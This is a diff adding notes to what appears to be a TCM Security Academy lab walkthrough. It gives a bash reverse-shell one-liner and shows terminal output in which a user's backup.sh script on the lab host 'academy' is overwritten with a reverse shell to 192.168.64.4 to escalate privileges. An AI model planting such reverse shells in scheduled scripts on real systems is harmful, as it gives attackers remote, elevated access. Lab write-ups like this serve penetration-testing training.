@@ -640,3 +640,30 @@ Here is the link:
 
 https://academy.tcm-sec.com/courses/1152300/lectures/34117488
 
+```
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+```
+
+COpy the reverse shell in the script of grimmie backup.sh
+
+```
+grimmie@academy:~$ cat backup.sh 
+#!/bin/bash
+
+rm /tmp/backup.zip
+zip -r /tmp/backup.zip /var/www/html/academy/includes
+chmod 700 /tmp/backup.zip
+grimmie@academy:~$ vi backup.sh
+grimmie@academy:~$ vi backup.sh
+
+
+---changed to ----
+
+
+grimmie@academy:~$ cat backup.sh 
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.64.4/8081 0>&1
+grimmie@academy:~$ 
+
+```
